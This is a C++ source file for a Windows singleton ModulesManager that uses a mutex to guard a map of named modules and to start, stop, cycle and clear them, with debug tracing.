#include "ModulesManager.h"
#include "Module.h"
#include "FunctionFunc.h"

ModulesManager* ModulesManager::Instance = NULL;
volatile LONG ModulesManager::lLock = 0;

ModulesManager* ModulesManager::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) ModulesManager();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

ModulesManager::ModulesManager() : hMutex(NULL) {
	hMutex = _CreateMutexW(NULL, FALSE, NULL);

	if (hMutex == NULL)
		throw new exception();
}

ModulesManager::~ModulesManager() {
	clear();

	if (hMutex != NULL)
		CloseHandle(hMutex);
}

void ModulesManager::clear() {
	map<wstring, Module *>::const_iterator iter;

	lock();
	
	for (iter = modulesList.begin(); iter != modulesList.end(); ++iter) {
		delete iter->second;
	}

	modulesList.clear();

	unlock();
}

void ModulesManager::lock() {
	_WaitForSingleObject(hMutex, INFINITE);
}

void ModulesManager::unlock() {
	ReleaseMutex(hMutex);
}

BOOL ModulesManager::add(const wstring& moduleName, JSONObject jConf, void* threadProc) {
	if (moduleName.empty() || threadProc == NULL)
		return FALSE;

	lock();

	Module* mod = new Module(threadProc, new Configuration(jConf));
	modulesList[moduleName] = mod;

	unlock();

	return TRUE;
}

void ModulesManager::stopAll() {
	map<wstring, Module *>::iterator iter;
	BOOL running = FALSE;

	lock();

	for (iter = modulesList.begin(); iter != modulesList.end(); ++iter) {
		Module* module = iter->second;

		if (module == NULL) {
			// WARNING
			continue;
		}

		module->stop();
	}

	unlock();
}

BOOL ModulesManager::start(wstring& moduleName) {
	if (moduleName.empty())
		return FALSE;

	lock();

	Module* module = modulesList[moduleName];

	// Module absent
	if (module == NULL) {
		DBG_TRACE_3(L"Debug - ModulesManager.cpp - Starting Module: ", moduleName, L" (NULL module)\n", 1, FALSE);
		unlock();
		return FALSE;
	}
	
	UINT status = module->getStatus();

	if (status == MODULE_RUNNING) {
		DBG_TRACE_3(L"Debug - ModulesManager.cpp - Starting Module: ", moduleName, L" (already running)\n", 1, FALSE);
		unlock();
		return TRUE;
	}

	if (module->run() == FALSE) {
		DBG_TRACE_3(L"Debug - ModulesManager.cpp - Starting Module: ", moduleName, L" (unable to start)\n", 1, FALSE);
		unlock();
		return FALSE;
	}

	unlock();
	return TRUE;
}

BOOL ModulesManager::stop(wstring& moduleName) {
	if (moduleName.empty())
		return FALSE;

	lock();

	Module* module = modulesList[moduleName];

	if (module == NULL) {
		// WARNING
		unlock();
		return FALSE;
	}

	module->stop();

	if (module->getStatus() != MODULE_STOPPED) {
		unlock();
		return FALSE;
	}

	unlock();
	return TRUE;
}

BOOL ModulesManager::cycle(wstring& moduleName) {
	if (moduleName.empty())
		return FALSE;

	lock();

	Module* module = modulesList[moduleName];

	if (module == NULL) {
		// WARNING
		unlock();
		return FALSE;
	}

	module->requestCycle();

	unlock();
	return TRUE;
}

BOOL ModulesManager::cycle(const WCHAR *moduleName) {
	wstring module = moduleName;
	
	return cycle(module);
}